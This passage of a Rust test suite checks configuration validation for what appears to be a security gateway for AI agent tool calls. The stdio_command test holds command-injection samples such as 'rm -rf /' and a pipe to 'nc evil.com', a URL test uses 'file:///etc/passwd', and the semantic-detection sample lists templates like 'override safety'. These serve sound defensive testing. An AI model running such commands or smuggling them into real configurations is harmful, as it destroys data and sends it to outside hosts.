fn test_validate_rejects_behavioral_alpha_nan() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.alpha = f64::NAN;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.alpha"), "got: {err}");
}

#[test]
fn test_validate_rejects_behavioral_threshold_zero() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.threshold = 0.0;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.threshold"), "got: {err}");
}

#[test]
fn test_validate_rejects_behavioral_threshold_nan() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.threshold = f64::NAN;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.threshold"), "got: {err}");
}

#[test]
fn test_validate_rejects_behavioral_max_agents_too_large() {
    let mut config = minimal_config();
    config.behavioral.max_agents = MAX_BEHAVIORAL_AGENTS + 1;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.max_agents"), "got: {err}");
}

#[test]
fn test_validate_rejects_behavioral_max_tools_too_large() {
    let mut config = minimal_config();
    config.behavioral.max_tools_per_agent = MAX_BEHAVIORAL_TOOLS_PER_AGENT + 1;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.max_tools_per_agent"), "got: {err}");
}

#[test]
fn test_validate_accepts_behavioral_alpha_one() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.alpha = 1.0;
    assert!(config.validate().is_ok());
}

// ── Data flow tracking config tests ──────────────────────────

#[test]
fn test_data_flow_config_defaults() {
    let config = DataFlowTrackingConfig::default();
    assert!(!config.enabled);
    assert_eq!(config.max_findings, 500);
    assert_eq!(config.max_fingerprints_per_pattern, 100);
    assert!(!config.require_exact_match);
}

#[test]
fn test_data_flow_config_from_toml() {
    let toml = r#"
[data_flow]
enabled = true
max_findings = 1000
max_fingerprints_per_pattern = 200
require_exact_match = true

[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.data_flow.enabled);
    assert_eq!(config.data_flow.max_findings, 1000);
    assert_eq!(config.data_flow.max_fingerprints_per_pattern, 200);
    assert!(config.data_flow.require_exact_match);
}

#[test]
fn test_data_flow_config_absent_uses_defaults() {
    let config = minimal_config();
    assert!(!config.data_flow.enabled);
    assert_eq!(config.data_flow.max_findings, 500);
}

#[test]
fn test_validate_rejects_data_flow_max_findings_too_large() {
    let mut config = minimal_config();
    config.data_flow.max_findings = MAX_DATA_FLOW_FINDINGS + 1;
    let err = config.validate().unwrap_err();
    assert!(err.contains("data_flow.max_findings"), "got: {err}");
}

#[test]
fn test_validate_rejects_data_flow_max_fingerprints_too_large() {
    let mut config = minimal_config();
    config.data_flow.max_fingerprints_per_pattern = MAX_DATA_FLOW_FINGERPRINTS + 1;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("data_flow.max_fingerprints_per_pattern"),
        "got: {err}"
    );
}

#[test]
fn test_validate_accepts_data_flow_at_max() {
    let mut config = minimal_config();
    config.data_flow.max_findings = MAX_DATA_FLOW_FINDINGS;
    config.data_flow.max_fingerprints_per_pattern = MAX_DATA_FLOW_FINGERPRINTS;
    assert!(config.validate().is_ok());
}

// ── Semantic detection config tests ──────────────────

#[test]
fn test_semantic_detection_config_defaults() {
    let config = SemanticDetectionConfig::default();
    assert!(!config.enabled);
    assert!((config.threshold - 0.45).abs() < f64::EPSILON);
    assert_eq!(config.min_text_length, 10);
    assert!(config.extra_templates.is_empty());
}

#[test]
fn test_semantic_detection_config_from_toml() {
    let toml = r#"
[semantic_detection]
enabled = true
threshold = 0.5
min_text_length = 20
extra_templates = ["steal all the data", "override safety"]

[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.semantic_detection.enabled);
    assert!((config.semantic_detection.threshold - 0.5).abs() < f64::EPSILON);
    assert_eq!(config.semantic_detection.min_text_length, 20);
    assert_eq!(config.semantic_detection.extra_templates.len(), 2);
}

#[test]
fn test_semantic_detection_config_absent_uses_defaults() {
    let config = minimal_config();
    assert!(!config.semantic_detection.enabled);
    assert!((config.semantic_detection.threshold - 0.45).abs() < f64::EPSILON);
}

#[test]
fn test_validate_rejects_semantic_threshold_zero() {
    let mut config = minimal_config();
    config.semantic_detection.enabled = true;
    config.semantic_detection.threshold = 0.0;
    let err = config.validate().unwrap_err();
    assert!(err.contains("semantic_detection.threshold"), "got: {err}");
}

#[test]
fn test_validate_rejects_semantic_threshold_nan() {
    let mut config = minimal_config();
    config.semantic_detection.enabled = true;
    config.semantic_detection.threshold = f64::NAN;
    let err = config.validate().unwrap_err();
    assert!(err.contains("semantic_detection.threshold"), "got: {err}");
}

#[test]
fn test_validate_rejects_semantic_threshold_above_one() {
    let mut config = minimal_config();
    config.semantic_detection.enabled = true;
    config.semantic_detection.threshold = 1.5;
    let err = config.validate().unwrap_err();
    assert!(err.contains("semantic_detection.threshold"), "got: {err}");
}

#[test]
fn test_validate_rejects_semantic_too_many_templates() {
    let mut config = minimal_config();
    config.semantic_detection.extra_templates = (0..=MAX_SEMANTIC_EXTRA_TEMPLATES)
        .map(|i| format!("template {i}"))
        .collect();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("semantic_detection.extra_templates"),
        "got: {err}"
    );
}

#[test]
fn test_validate_accepts_semantic_at_one() {
    let mut config = minimal_config();
    config.semantic_detection.enabled = true;
    config.semantic_detection.threshold = 1.0;
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════
// ETDI Configuration Tests
// ═══════════════════════════════════════════════════

#[test]
fn test_etdi_config_default() {
    let config = EtdiConfig::default();
    assert!(!config.enabled);
    assert!(!config.require_signatures);
    assert_eq!(
        config.signature_algorithm,
        vellaveto_types::SignatureAlgorithm::Ed25519
    );
    assert!(config.data_path.is_none());
    assert!(!config.allowed_signers.has_any());
    assert!(!config.attestation.enabled);
    assert!(!config.version_pinning.enabled);
}

#[test]
fn test_etdi_config_toml_parsing() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[etdi]
enabled = true
require_signatures = true
signature_algorithm = "ed25519"
data_path = "/var/lib/vellaveto/etdi"

[etdi.allowed_signers]
fingerprints = ["abc123", "def456"]
spiffe_ids = ["spiffe://example.org/provider"]

[etdi.attestation]
enabled = true
transparency_log = true
rekor_url = "https://rekor.sigstore.dev"

[etdi.version_pinning]
enabled = true
enforcement = "block"
auto_pin = true
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.etdi.enabled);
    assert!(config.etdi.require_signatures);
    assert_eq!(
        config.etdi.data_path,
        Some("/var/lib/vellaveto/etdi".to_string())
    );
    assert_eq!(config.etdi.allowed_signers.fingerprints.len(), 2);
    assert_eq!(config.etdi.allowed_signers.spiffe_ids.len(), 1);
    assert!(config.etdi.attestation.enabled);
    assert!(config.etdi.attestation.transparency_log);
    assert_eq!(
        config.etdi.attestation.rekor_url,
        Some("https://rekor.sigstore.dev".to_string())
    );
    assert!(config.etdi.version_pinning.enabled);
    assert!(config.etdi.version_pinning.is_blocking());
    assert!(config.etdi.version_pinning.auto_pin);
}

#[test]
fn test_allowed_signers_has_any() {
    let empty = AllowedSignersConfig::default();
    assert!(!empty.has_any());

    let with_fingerprint = AllowedSignersConfig {
        fingerprints: vec!["abc".to_string()],
        spiffe_ids: vec![],
    };
    assert!(with_fingerprint.has_any());

    let with_spiffe = AllowedSignersConfig {
        fingerprints: vec![],
        spiffe_ids: vec!["spiffe://test".to_string()],
    };
    assert!(with_spiffe.has_any());
}

#[test]
fn test_allowed_signers_is_fingerprint_trusted() {
    let signers = AllowedSignersConfig {
        fingerprints: vec!["ABC123".to_string()],
        spiffe_ids: vec![],
    };
    // Case-insensitive match
    assert!(signers.is_fingerprint_trusted("abc123"));
    assert!(signers.is_fingerprint_trusted("ABC123"));
    assert!(!signers.is_fingerprint_trusted("xyz789"));
}

#[test]
fn test_allowed_signers_is_spiffe_trusted() {
    let signers = AllowedSignersConfig {
        fingerprints: vec![],
        spiffe_ids: vec!["spiffe://example.org/tool".to_string()],
    };
    assert!(signers.is_spiffe_trusted("spiffe://example.org/tool"));
    assert!(!signers.is_spiffe_trusted("spiffe://example.org/other"));
}

#[test]
fn test_version_pinning_is_blocking() {
    let warn = VersionPinningConfig {
        enabled: true,
        enforcement: "warn".to_string(),
        pins_path: None,
        auto_pin: false,
    };
    assert!(!warn.is_blocking());

    let block = VersionPinningConfig {
        enabled: true,
        enforcement: "block".to_string(),
        pins_path: None,
        auto_pin: false,
    };
    assert!(block.is_blocking());

    // Case-insensitive
    let block_caps = VersionPinningConfig {
        enabled: true,
        enforcement: "BLOCK".to_string(),
        pins_path: None,
        auto_pin: false,
    };
    assert!(block_caps.is_blocking());
}

// ═══════════════════════════════════════════════════
// LIMITS CONFIG TESTS
// ═══════════════════════════════════════════════════

#[test]
fn test_limits_config_defaults() {
    let config = LimitsConfig::default();
    assert_eq!(config.max_response_body_bytes, 10 * 1024 * 1024);
    assert_eq!(config.max_sse_event_bytes, 1024 * 1024);
    assert_eq!(config.max_jsonrpc_line_bytes, 1024 * 1024);
    assert_eq!(config.max_call_chain_length, 20);
    assert_eq!(config.call_chain_max_age_secs, 300);
    assert_eq!(config.request_timeout_secs, 30);
    assert_eq!(config.max_action_history, 100);
    assert_eq!(config.max_pending_tool_calls, 256);
    assert_eq!(config.max_call_chain_header_bytes, 8192);
    assert_eq!(config.max_trace_header_bytes, 4096);
    assert_eq!(config.max_jsonrpc_id_key_len, 256);
}

#[test]
fn test_limits_config_from_toml() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[limits]
max_response_body_bytes = 52428800
max_sse_event_bytes = 2097152
max_jsonrpc_line_bytes = 2097152
max_call_chain_length = 50
call_chain_max_age_secs = 600
request_timeout_secs = 60
max_action_history = 200
max_pending_tool_calls = 512
max_call_chain_header_bytes = 16384
max_trace_header_bytes = 8192
max_jsonrpc_id_key_len = 512
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.limits.max_response_body_bytes, 50 * 1024 * 1024);
    assert_eq!(config.limits.max_sse_event_bytes, 2 * 1024 * 1024);
    assert_eq!(config.limits.max_jsonrpc_line_bytes, 2 * 1024 * 1024);
    assert_eq!(config.limits.max_call_chain_length, 50);
    assert_eq!(config.limits.call_chain_max_age_secs, 600);
    assert_eq!(config.limits.request_timeout_secs, 60);
    assert_eq!(config.limits.max_action_history, 200);
    assert_eq!(config.limits.max_pending_tool_calls, 512);
    assert_eq!(config.limits.max_call_chain_header_bytes, 16384);
    assert_eq!(config.limits.max_trace_header_bytes, 8192);
    assert_eq!(config.limits.max_jsonrpc_id_key_len, 512);
}

#[test]
fn test_limits_config_partial_override() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[limits]
max_response_body_bytes = 5242880
request_timeout_secs = 120
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    // Overridden values
    assert_eq!(config.limits.max_response_body_bytes, 5 * 1024 * 1024);
    assert_eq!(config.limits.request_timeout_secs, 120);
    // Default values
    assert_eq!(config.limits.max_sse_event_bytes, 1024 * 1024);
    assert_eq!(config.limits.max_call_chain_length, 20);
    assert_eq!(config.limits.call_chain_max_age_secs, 300);
    assert_eq!(config.limits.max_action_history, 100);
}

#[test]
fn test_limits_config_json_roundtrip() {
    let config = LimitsConfig {
        max_response_body_bytes: 20 * 1024 * 1024,
        max_sse_event_bytes: 2 * 1024 * 1024,
        max_jsonrpc_line_bytes: 2 * 1024 * 1024,
        max_call_chain_length: 40,
        call_chain_max_age_secs: 600,
        request_timeout_secs: 60,
        max_action_history: 200,
        max_pending_tool_calls: 512,
        max_call_chain_header_bytes: 16384,
        max_trace_header_bytes: 8192,
        max_jsonrpc_id_key_len: 512,
    };

    let json = serde_json::to_string(&config).unwrap();
    let parsed: LimitsConfig = serde_json::from_str(&json).unwrap();
    assert_eq!(config, parsed);
}

// --- Extension config tests ---

#[test]
fn test_extension_config_default() {
    let config = ExtensionConfig::default();
    assert!(!config.enabled);
    assert!(config.allowed_extensions.is_empty());
    assert!(config.blocked_extensions.is_empty());
    assert!(!config.require_signatures);
    assert!(config.trusted_public_keys.is_empty());
    assert_eq!(config.default_resource_limits.max_concurrent_requests, 10);
    assert_eq!(config.default_resource_limits.max_requests_per_sec, 100);
    assert!(config.validate().is_ok());
}

#[test]
fn test_extension_config_validation() {
    let config = ExtensionConfig {
        enabled: true,
        default_resource_limits: vellaveto_types::ExtensionResourceLimits {
            max_concurrent_requests: 0,
            ..Default::default()
        },
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_concurrent_requests"));
}

// ═══════════════════════════════════════════════════════════════════════════
// Phase 18: Transport configuration
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_transport_config_defaults() {
    let config = TransportConfig::default();
    assert!(config.discovery_enabled);
    assert!(config.upstream_priorities.is_empty());
    assert!(config.restricted_transports.is_empty());
    assert!(config.advertise_capabilities);
    assert_eq!(config.max_fallback_retries, 1);
    assert_eq!(config.fallback_timeout_secs, 10);
}

#[test]
fn test_transport_config_validation_conflict() {
    use vellaveto_types::TransportProtocol;
    let config = TransportConfig {
        upstream_priorities: vec![TransportProtocol::Grpc],
        restricted_transports: vec![TransportProtocol::Grpc],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("both upstream_priorities and restricted_transports"));
}

#[test]
fn test_transport_config_validation_bounds() {
    let config = TransportConfig {
        max_fallback_retries: 11,
        ..Default::default()
    };
    assert!(config.validate().is_err());

    let mut config = TransportConfig {
        fallback_timeout_secs: 0,
        ..Default::default()
    };
    assert!(config.validate().is_err());

    config.fallback_timeout_secs = 121;
    assert!(config.validate().is_err());

    config.fallback_timeout_secs = 60;
    assert!(config.validate().is_ok());
}

#[test]
fn test_transport_config_toml_deserialization() {
    let toml_str = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[transport]
discovery_enabled = false
max_fallback_retries = 3
fallback_timeout_secs = 30
"#;
    let config = PolicyConfig::from_toml(toml_str).unwrap();
    assert!(!config.transport.discovery_enabled);
    assert_eq!(config.transport.max_fallback_retries, 3);
    assert_eq!(config.transport.fallback_timeout_secs, 30);
}

// ═══════════════════════════════════════════════════
// PHASE 29: CROSS-TRANSPORT FALLBACK CONFIG TESTS
// ═══════════════════════════════════════════════════

#[test]
fn test_transport_config_cross_fallback_defaults() {
    let config = TransportConfig::default();
    assert!(!config.cross_transport_fallback);
    assert!(config.transport_overrides.is_empty());
    assert_eq!(config.transport_circuit_breaker_failure_threshold, 3);
    assert_eq!(config.transport_circuit_breaker_open_duration_secs, 30);
    assert!(!config.stdio_fallback_enabled);
    assert!(config.stdio_command.is_none());
    assert!(config.validate().is_ok());
}

#[test]
fn test_transport_config_cb_threshold_validation() {
    use vellaveto_types::TransportProtocol;
    // Zero threshold (below minimum)
    let config = TransportConfig {
        transport_circuit_breaker_failure_threshold: 0,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("transport_circuit_breaker_failure_threshold"));

    // Above maximum
    let config = TransportConfig {
        transport_circuit_breaker_failure_threshold: 51,
        ..Default::default()
    };
    assert!(config.validate().is_err());

    // Valid boundary values
    let config = TransportConfig {
        transport_circuit_breaker_failure_threshold: 1,
        ..Default::default()
    };
    assert!(config.validate().is_ok());

    let config = TransportConfig {
        transport_circuit_breaker_failure_threshold: 50,
        ..Default::default()
    };
    assert!(config.validate().is_ok());

    // Open duration boundaries
    let config = TransportConfig {
        transport_circuit_breaker_open_duration_secs: 0,
        ..Default::default()
    };
    assert!(config.validate().is_err());

    let config = TransportConfig {
        transport_circuit_breaker_open_duration_secs: 601,
        ..Default::default()
    };
    assert!(config.validate().is_err());

    let config = TransportConfig {
        transport_circuit_breaker_open_duration_secs: 600,
        ..Default::default()
    };
    assert!(config.validate().is_ok());

    let _ = TransportProtocol::Http; // suppress unused import warning
}

#[test]
fn test_transport_config_overrides_empty_vec_rejected() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    overrides.insert("fs_*".to_string(), Vec::new());
    let config = TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("must not be empty"));
    let _ = TransportProtocol::Http;
}

#[test]
fn test_transport_config_overrides_restricted_rejected() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    overrides.insert("db_*".to_string(), vec![TransportProtocol::Grpc]);
    let config = TransportConfig {
        transport_overrides: overrides,
        restricted_transports: vec![TransportProtocol::Grpc],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("restricted transport"));
}

#[test]
fn test_transport_config_stdio_requires_command() {
    let config = TransportConfig {
        stdio_fallback_enabled: true,
        stdio_command: None,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("stdio_command"));
}

#[test]
fn test_transport_config_stdio_empty_command_rejected() {
    let config = TransportConfig {
        stdio_fallback_enabled: true,
        stdio_command: Some("  ".to_string()),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("must not be empty"));
}

#[test]
fn test_transport_config_stdio_valid() {
    let config = TransportConfig {
        stdio_fallback_enabled: true,
        stdio_command: Some("/usr/bin/mcp-server".to_string()),
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

// FIND-R41-002: stdio_command must be absolute path
#[test]
fn test_transport_config_stdio_relative_path_rejected() {
    let config = TransportConfig {
        stdio_fallback_enabled: true,
        stdio_command: Some("mcp-server".to_string()),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("absolute path"), "got: {err}");
}

// FIND-R41-002: stdio_command with shell metacharacters rejected
#[test]
fn test_transport_config_stdio_metacharacters_rejected() {
    for cmd in &[
        "/usr/bin/cmd; rm -rf /",
        "/usr/bin/cmd | nc evil.com",
        "/usr/bin/cmd$(whoami)",
        "/usr/bin/cmd`whoami`",
        "/usr/bin/cmd > /tmp/out",
    ] {
        let config = TransportConfig {
            stdio_fallback_enabled: true,
            stdio_command: Some(cmd.to_string()),
            ..Default::default()
        };
        assert!(
            config.validate().is_err(),
            "expected rejection for command: {cmd}"
        );
    }
}

// FIND-R41-009: transport_overrides count bounded
#[test]
fn test_transport_config_overrides_count_bounded() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    for i in 0..101 {
        overrides.insert(format!("tool_{i}"), vec![TransportProtocol::Http]);
    }
    let config = TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("101 entries"), "got: {err}");
}

// FIND-R41-014: transport_overrides empty key rejected
#[test]
fn test_transport_config_overrides_empty_key_rejected() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(String::new(), vec![TransportProtocol::Http]);
    let config = TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("empty key"), "got: {err}");
}

// FIND-R41-014: transport_overrides null byte in key rejected
#[test]
fn test_transport_config_overrides_null_byte_rejected() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    overrides.insert("tool_\0bad".to_string(), vec![TransportProtocol::Http]);
    let config = TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    // FIND-R44-007: Now caught by broader ASCII control character check.
    assert!(err.contains("control"), "got: {err}");
}

#[test]
fn test_transport_config_cross_fallback_serde_roundtrip() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "fs_*".to_string(),
        vec![TransportProtocol::Http, TransportProtocol::WebSocket],
    );
    let config = TransportConfig {
        cross_transport_fallback: true,
        transport_overrides: overrides,
        transport_circuit_breaker_failure_threshold: 5,
        transport_circuit_breaker_open_duration_secs: 60,
        stdio_fallback_enabled: true,
        stdio_command: Some("/usr/bin/mcp-server".to_string()),
        ..Default::default()
    };
    let json_str = serde_json::to_string(&config).unwrap();
    let deserialized: TransportConfig = serde_json::from_str(&json_str).unwrap();
    assert_eq!(config, deserialized);
}

#[test]
fn test_transport_config_overrides_valid() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "db_*".to_string(),
        vec![TransportProtocol::Grpc, TransportProtocol::Http],
    );
    let config = TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

#[test]
fn test_gateway_backend_transport_urls_empty_url_rejected() {
    use vellaveto_types::TransportProtocol;
    let mut transport_urls = std::collections::HashMap::new();
    transport_urls.insert(TransportProtocol::Grpc, "  ".to_string());
    let config = GatewayConfig {
        enabled: true,
        backends: vec![BackendConfig {
            id: "b1".to_string(),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec!["test_".to_string()],
            weight: 100,
            transport_urls,
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("transport_urls"));
    assert!(err.contains("must not be empty"));
}

#[test]
fn test_gateway_backend_transport_urls_valid() {
    use vellaveto_types::TransportProtocol;
    let mut transport_urls = std::collections::HashMap::new();
    transport_urls.insert(
        TransportProtocol::Grpc,
        "http://localhost:50051".to_string(),
    );
    transport_urls.insert(
        TransportProtocol::WebSocket,
        "ws://localhost:8000/ws".to_string(),
    );
    let config = GatewayConfig {
        enabled: true,
        backends: vec![BackendConfig {
            id: "b1".to_string(),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec!["test_".to_string()],
            weight: 100,
            transport_urls,
        }],
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

// FIND-R41-008: transport_urls with bad URL scheme rejected
#[test]
fn test_gateway_backend_transport_urls_bad_scheme_rejected() {
    use vellaveto_types::TransportProtocol;
    let mut transport_urls = std::collections::HashMap::new();
    transport_urls.insert(TransportProtocol::Http, "file:///etc/passwd".to_string());
    let config = GatewayConfig {
        enabled: true,
        backends: vec![BackendConfig {
            id: "b1".to_string(),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec!["test_".to_string()],
            weight: 100,
            transport_urls,
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("invalid URL scheme"), "got: {err}");
}

// FIND-R41-008: WebSocket transport_url requires ws:// or wss://
#[test]
fn test_gateway_backend_transport_urls_ws_scheme_validated() {
    use vellaveto_types::TransportProtocol;
    let mut transport_urls = std::collections::HashMap::new();
    transport_urls.insert(
        TransportProtocol::WebSocket,
        "http://localhost:8000/ws".to_string(),
    );
    let config = GatewayConfig {
        enabled: true,
        backends: vec![BackendConfig {
            id: "b1".to_string(),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec!["test_".to_string()],
            weight: 100,
            transport_urls,
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("invalid URL scheme"), "got: {err}");
}

// ═══════════════════════════════════════════════════
// PHASE 20: GATEWAY CONFIG TESTS
// ═══════════════════════════════════════════════════

#[test]
fn test_gateway_config_default() {
    let config = GatewayConfig::default();
    assert!(!config.enabled);
    assert!(config.backends.is_empty());
    assert_eq!(config.health_check_interval_secs, 15);
    assert_eq!(config.unhealthy_threshold, 3);
    assert_eq!(config.healthy_threshold, 2);
}

#[test]
fn test_gateway_config_toml_parse() {
    let toml_str = r#"
[[policies]]
name = "allow-all"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[gateway]
enabled = true
health_check_interval_secs = 10
unhealthy_threshold = 5
healthy_threshold = 3

[[gateway.backends]]
id = "fs-server"
url = "http://localhost:8001/mcp"
tool_prefixes = ["fs_", "file_"]
weight = 90

[[gateway.backends]]
id = "default"
url = "http://localhost:8000/mcp"
"#;
    let config = PolicyConfig::from_toml(toml_str).unwrap();
    assert!(config.gateway.enabled);
    assert_eq!(config.gateway.backends.len(), 2);
    assert_eq!(config.gateway.backends[0].id, "fs-server");
    assert_eq!(
        config.gateway.backends[0].tool_prefixes,
        vec!["fs_", "file_"]
    );
    assert_eq!(config.gateway.backends[0].weight, 90);
    assert_eq!(config.gateway.backends[1].id, "default");
    assert!(config.gateway.backends[1].tool_prefixes.is_empty());
    assert_eq!(config.gateway.backends[1].weight, 100); // default
    assert_eq!(config.gateway.health_check_interval_secs, 10);
    assert!(config.validate().is_ok());
}

#[test]
fn test_gateway_config_validate_duplicate_ids() {
    let mut config = minimal_config();
    config.gateway.enabled = true;
    config.gateway.backends = vec![
        BackendConfig {
            id: "dup".to_string(),
            url: "http://a:8000".to_string(),
            tool_prefixes: vec!["a_".to_string()],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        },
        BackendConfig {
            id: "dup".to_string(),
            url: "http://b:8000".to_string(),
            tool_prefixes: vec!["b_".to_string()],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        },
    ];
    let err = config.validate().unwrap_err();
    assert!(err.contains("duplicate id"), "got: {err}");
}

#[test]
fn test_gateway_config_validate_zero_weight() {
    let mut config = minimal_config();
    config.gateway.enabled = true;
    config.gateway.backends = vec![BackendConfig {
        id: "b".to_string(),
        url: "http://a:8000".to_string(),
        tool_prefixes: vec![],
        weight: 0,
        transport_urls: std::collections::HashMap::new(),
    }];
    let err = config.validate().unwrap_err();
    assert!(err.contains("weight must be >= 1"), "got: {err}");
}

#[test]
fn test_gateway_config_validate_interval_bounds() {
    let mut config = minimal_config();
    config.gateway.enabled = true;
    config.gateway.backends = vec![BackendConfig {
        id: "b".to_string(),
        url: "http://a:8000".to_string(),
        tool_prefixes: vec![],
        weight: 100,
        transport_urls: std::collections::HashMap::new(),
    }];

    config.gateway.health_check_interval_secs = 4;
    assert!(config.validate().unwrap_err().contains("[5, 300]"));

    config.gateway.health_check_interval_secs = 301;
    assert!(config.validate().unwrap_err().contains("[5, 300]"));

    config.gateway.health_check_interval_secs = 15;
    assert!(config.validate().is_ok());
}

#[test]
fn test_gateway_config_disabled_skips_validation() {
    let mut config = minimal_config();
    config.gateway.enabled = false;
    // Invalid: no backends, but validation should skip because disabled
    config.gateway.backends = vec![];
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════════════════════════════════
// Phase 21: ABAC config tests
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_abac_default_config_valid() {
    let config = minimal_config();
    assert!(!config.abac.enabled);
    assert!(config.abac.policies.is_empty());
    assert!(config.validate().is_ok());
}

#[test]
fn test_abac_toml_parse_with_policies() {
    let toml = r#"
[[policies]]
name = "allow-all"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[abac]
enabled = true

[[abac.policies]]
id = "p1"
description = "Permit agents to read"
effect = "permit"
priority = 10

[abac.policies.principal]
principal_type = "Agent"
id_patterns = ["code-*"]

[abac.policies.action]
patterns = ["filesystem:read_*"]
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.abac.enabled);
    assert_eq!(config.abac.policies.len(), 1);
    assert_eq!(config.abac.policies[0].id, "p1");
    assert_eq!(
        config.abac.policies[0].effect,
        vellaveto_types::AbacEffect::Permit
    );
    assert!(config.validate().is_ok());
}

#[test]
fn test_abac_validation_duplicate_policy_ids() {
    let mut config = minimal_config();
    config.abac.enabled = true;
    let policy = vellaveto_types::AbacPolicy {
        id: "dup".to_string(),
        description: "test".to_string(),
        effect: vellaveto_types::AbacEffect::Permit,
        priority: 0,
        principal: Default::default(),
        action: Default::default(),
        resource: Default::default(),
        conditions: vec![],
    };
    config.abac.policies = vec![policy.clone(), policy];
    let err = config.validate().unwrap_err();
    assert!(err.contains("duplicate id"), "got: {err}");
}

#[test]
fn test_abac_validation_too_many_policies() {
    let mut config = minimal_config();
    config.abac.enabled = true;
    config.abac.policies = (0..513)
        .map(|i| vellaveto_types::AbacPolicy {
            id: format!("p{i}"),
            description: "test".to_string(),
            effect: vellaveto_types::AbacEffect::Permit,
            priority: 0,
            principal: Default::default(),
            action: Default::default(),
            resource: Default::default(),
            conditions: vec![],
        })
        .collect();
    let err = config.validate().unwrap_err();
    assert!(err.contains("max is 512"), "got: {err}");
}

#[test]
fn test_abac_validation_invalid_risk_threshold() {
    let mut config = minimal_config();
    config.abac.enabled = true;
    config.abac.continuous_auth.enabled = true;
    config.abac.continuous_auth.risk_threshold = 1.5;
    let err = config.validate().unwrap_err();
    assert!(err.contains("risk_threshold"), "got: {err}");
}

#[test]
fn test_abac_disabled_skips_validation() {
    let mut config = minimal_config();
    config.abac.enabled = false;
    // Invalid: too many policies, but validation should skip because disabled
    config.abac.policies = (0..600)
        .map(|i| vellaveto_types::AbacPolicy {
            id: format!("p{i}"),
            description: "test".to_string(),
            effect: vellaveto_types::AbacEffect::Permit,
            priority: 0,
            principal: Default::default(),
            action: Default::default(),
            resource: Default::default(),
            conditions: vec![],
        })
        .collect();
    assert!(config.validate().is_ok());
}

// ── Multimodal policy config tests ──────────────────────────────

#[test]
fn test_multimodal_config_defaults_when_absent() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(!config.multimodal.enabled);
    assert!(config.multimodal.enable_ocr);
    assert_eq!(config.multimodal.max_image_size, 10 * 1024 * 1024);
    assert_eq!(config.multimodal.max_audio_size, 50 * 1024 * 1024);
